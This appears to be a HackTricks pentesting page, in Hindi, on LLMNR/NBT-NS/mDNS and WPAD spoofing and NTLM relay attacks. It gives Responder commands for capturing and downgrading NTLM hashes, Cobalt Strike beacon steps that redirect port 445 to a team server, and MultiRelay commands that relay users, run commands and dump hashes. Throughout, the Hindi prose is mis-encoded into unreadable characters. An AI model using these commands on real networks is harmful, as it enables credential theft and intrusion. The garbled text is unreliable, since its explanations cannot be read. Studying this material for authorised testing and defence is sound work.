# Spoofing LLMNR, NBT-NS, mDNS/DNS рдФрд░ WPAD рдФрд░ рд░рд┐рд▓реЗ рдЕрдЯреИрдХ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

## рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓

### рд╕реНрдерд╛рдиреАрдп рд╣реЛрд╕реНрдЯ рд╕рдВрдХреЗрдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓
- **LLMNR, NBT-NS, рдФрд░ mDNS**:
- рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдФрд░ рдЕрдиреНрдп рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо LLMNR рдФрд░ NBT-NS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм DNS рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИред рдЙрд╕реА рддрд░рд╣, Apple рдФрд░ Linux рд╕рд┐рд╕реНрдЯрдо mDNS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред
- рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЕрдкрдиреЗ рдЕрдереЗрдВрдЯрд┐рдХреЗрдЯреЗрдб, рдпреВрдбреАрдкреА рдкрд░ рдкреНрд░рд╕рд╛рд░рд┐рдд рдкреНрд░рдХреГрддрд┐ рдХреЗ рдХрд╛рд░рдг рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдФрд░ рд╕реНрдкреВрдлрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВред
- [Responder](https://github.com/lgandx/Responder) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреЛ рдЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ рдХрд╛ рдкреНрд░рд╢реНрди рдХрд░ рд░рд╣реЗ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЛ рдЭреВрдареЗ рдЬрд╡рд╛рдм рднреЗрдЬрдХрд░ред
- Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛ рдЕрдиреБрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### рд╡реЗрдм рдкреНрд░реЙрдХреНрд╕реА рдСрдЯреЛ-рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (WPAD)
- WPAD рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЦреЛрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
- рдЦреЛрдЬ DHCP, DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдпрд╛ DNS рд╡рд┐рдлрд▓ рд╣реЛрдиреЗ рдкрд░ LLMNR рдФрд░ NBT-NS рдореЗрдВ рд▓реМрдЯрдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
- Responder рджреНрд╡рд╛рд░рд╛ WPAD рд╣рдорд▓реЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА WPAD рд╕рд░реНрд╡рд░реЛрдВ рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред

### рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкреЙрдЗрдЬрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП Responder
- **Responder** рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ LLMNR, NBT-NS, рдФрд░ mDNS рдХреНрд╡реЗрд░реА рдХреЛ рдкреЙрдЗрдЬрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рд╢реНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЪреБрдирдХрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ SMB рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд▓рдХреНрд╖реНрдп рдмрдирд╛рддрд╛ рд╣реИред
- рдпрд╣ Kali Linux рдореЗрдВ рдкреВрд░реНрд╡-рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, `/etc/responder/Responder.conf` рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- Responder рд╕реНрдХреНрд░реАрди рдкрд░ рдкрдХрдбрд╝реЗ рдЧрдП рд╣реИрд╢ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ `/usr/share/responder/logs` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рд╣реЗрдЬрддрд╛ рд╣реИред
- рдпрд╣ IPv4 рдФрд░ IPv6 рджреЛрдиреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред
- Responder рдХрд╛ Windows рд╕рдВрд╕реНрдХрд░рдг рдпрд╣рд╛рдБ рдЙрдкрд▓рдмреНрдз рд╣реИ: [рдпрд╣рд╛рдБ](https://github.com/lgandx/Responder-Windows)ред

#### Responder рдЪрд▓рд╛рдирд╛
- рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде Responder рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП: `responder -I <Interface>`
- рдЕрдзрд┐рдХ рдкреНрд░рд╡реЗрд╢ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдмрд┐рдВрдЧ (рд╕рдВрднрд╛рд╡рд┐рдд рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЗ рд╕рд╛рде): `responder -I <Interface> -P -r -v`
- NTLMv1 рдЪреИрд▓реЗрдВрдЬ/рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЖрд╕рд╛рди рдХреНрд░реИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рддрдХрдиреАрдХ: `responder -I <Interface> --lm --disable-ess`
- WPAD рдЕрдиреБрдХрд░рдг рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: `responder -I <Interface> --wpad`
- NetBIOS рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ IP рдкрд░ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `responder.py -I <interface> -Pv`

### Responder рдХреЗ рд╕рд╛рде DHCP рдкреЙрдЗрдЬрдирд┐рдВрдЧ
- DHCP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реНрдкреВрдлрд╝ рдХрд░рдиреЗ рд╕реЗ рдПрдХ рдкреАрдбрд╝рд┐рдд рдХрд╛ рд░реВрдЯрд┐рдВрдЧ рд╕реВрдЪрдирд╛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдкреЙрдЗрдЬрди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, ARP рдкреЙрдЗрдЬрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдПрдХ рдЧреБрдкреНрдд рд╡реИрдХрд▓реНрдкрд┐рдХрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред
- рд▓рдХреНрд╖реНрдп рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЗ рд╕рдЯреАрдХ рдЬреНрдЮрд╛рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
- рд╣рдорд▓рд╛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП: `./Responder.py -I eth0 -Pdv`
- рдпрд╣ рд╡рд┐рдзрд┐ NTLMv1/2 рд╣реИрд╢ рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдиреЗрдЯрд╡рд░реНрдХ рд╡рд┐рдШрдЯрди рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рд╡рдзрд╛рдиреА рд╕реЗ рд╣реИрдВрдбрд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

### Responder рдХреЗ рд╕рд╛рде рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрдкреНрдЪрд░рд┐рдВрдЧ
- Responder рдЙрдкрд░реЛрдХреНрдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░реЗрдЧрд╛, рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдЧрд╛ (рд╕рд╛рдорд╛рдиреНрдпрдд: NTLMv2 рдЪреИрд▓реЗрдВрдЬ/рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛) рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЭреВрдареА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред
- рдХреНрд░реИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП NetNTLMv1 рдпрд╛ ESS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпрд╛рд╕ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЗрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛рдиреВрдиреА рдФрд░ рдиреИрддрд┐рдХ рд░реВрдк рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдП, рдЙрдЪрд┐рдд рдЕрдзрд┐рдХреГрддрд┐ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХреА рдЬрд╛рдП рдФрд░ рдЕрд╡реИрдз рдкрд╣реБрдВрдЪ рдпрд╛ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕реЗ рдмрдЪрд╛ рдЬрд╛рдПред

## Inveigh

Inveigh рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд░реНрд╕ рдФрд░ рд░реЗрдб рдЯреАрдорд░реНрд╕ рдХреЗ рд▓рд┐рдП, рд╡рд┐рдВрдбреЛрдЬ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ Responder рдХреЗ рд╕рдорд╛рди рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рд╕реНрдкреВрдлрд┐рдВрдЧ рдФрд░ рдореИрди-рдЗрди-рдж-рдорд┐рдбрд▓ рд╣рдорд▓реЗ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕реЗ C# рдмрд╛рдЗрдирд░реА рдореЗрдВ рд╡рд┐рдХрд╕рд┐рдд рд╣реБрдЖ рд╣реИ, [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) рдФрд░ [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) рдореБрдЦреНрдп рд╕рдВрд╕реНрдХрд░рдг рд╣реИрдВред рд╡рд┐рд╕реНрддреГрдд рдкреИрд░рд╛рдореАрдЯрд░ рдФрд░ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА [**рд╡рд┐рдХрд┐**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред

Inveigh рдХреЛ PowerShell рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
рдпрд╛ C# рдмрд╛рдЗрдирд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд:
```bash
Inveigh.exe
```
### NTLM рд░рд┐рд▓реЗ рд╣рдорд▓рд╛

рдпрд╣ рд╣рдорд▓рд╛ SMB рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдПрдХ рд▓рдХреНрд╖реНрдп рдорд╢реАрди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рд╕рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рд╢реИрд▓ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдореБрдЦреНрдп рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:
- рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд░рд┐рд▓реЗ рд╣реЛрд╕реНрдЯ рдкрд░ рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдПрдХреНрд╕реЗрд╕ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
- SMB рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

#### 445 рдкреЛрд░реНрдЯ рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдФрд░ рдЯрдирд▓рд┐рдВрдЧ

рдЙрди рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ рд╕реАрдзрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдЪрдп рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ, рдкреЛрд░реНрдЯ 445 рдкрд░ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдлреЙрд░рд╡рд░реНрдб рдФрд░ рдЯрдирд▓ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред [**PortBender**](https://github.com/praetorian-inc/PortBender) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рд╕рд╣рд╛рдпрдХ рд╣реЛрддреЗ рд╣реИрдВ рдкреЛрд░реНрдЯ 445 рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдПрдХ рдФрд░ рдкреЛрд░реНрдЯ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдореЗрдВ, рдЬреЛ рдбреНрд░рд╛рдЗрд╡рд░ рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдПрдХреНрд╕реЗрд╕ рдЙрдкрд▓рдмреНрдз рд╣реЛрдиреЗ рдкрд░ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рдореЗрдВ PortBender рд╕реЗрдЯрдЕрдк рдФрд░ рдСрдкрд░реЗрд╢рди:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЙрдкрдХрд░рдг

- **Metasploit**: рдкреНрд░реЙрдХреНрд╕реА, рд╕реНрдерд╛рдиреАрдп рдФрд░ рджреВрд░рд╕реНрде рд╣реЛрд╕реНрдЯ рд╡рд┐рд╡рд░рдг рдХреЗ рд╕рд╛рде рд╕реЗрдЯрдЕрдк рдХрд░реЗрдВред
- **smbrelayx**: SMB рд╕рддреНрд░реЛрдВ рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдиреЗ рдФрд░ рдХрдорд╛рдВрдб рдпрд╛ рдмреИрдХрдбреЛрдЕрд░ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ Python рд╕реНрдХреНрд░рд┐рдкреНрдЯред
- **MultiRelay**: рдПрдХ рдЙрдкрдХрд░рдг Responder рд╕реБрдЗрдЯ рд╕реЗ, рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдпрд╛ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдиреЗ, рдХрдорд╛рдВрдб рдЪрд▓рд╛рдиреЗ рдпрд╛ рд╣реИрд╢ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рд╣рд░ рдЙрдкрдХрд░рдг рдХреЛ рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ рддреЛ рдПрдХ SOCKS рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд░рдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде рднреА рд╣рдорд▓реЗ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рдмрдирд╛рддрд╛ рд╣реИред

### MultiRelay рдСрдкрд░реЗрд╢рди

MultiRelay рдХреЛ _**/usr/share/responder/tools**_ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рдирд┐рд░реНрд╡рд╛рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЖрдИрдкреА рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдХреЗред
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### Force NTLM Logins

Windows рдореЗрдВ рдЖрдкрдХреЛ **рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдЦрд╛рддреЛрдВ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдорд╢реАрдиреЛрдВ рдкрд░ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ рдФрд░ рдЬрд╛рдиреЗрдВ рдХреИрд╕реЗ:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╡рд╛рд▓реЗ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
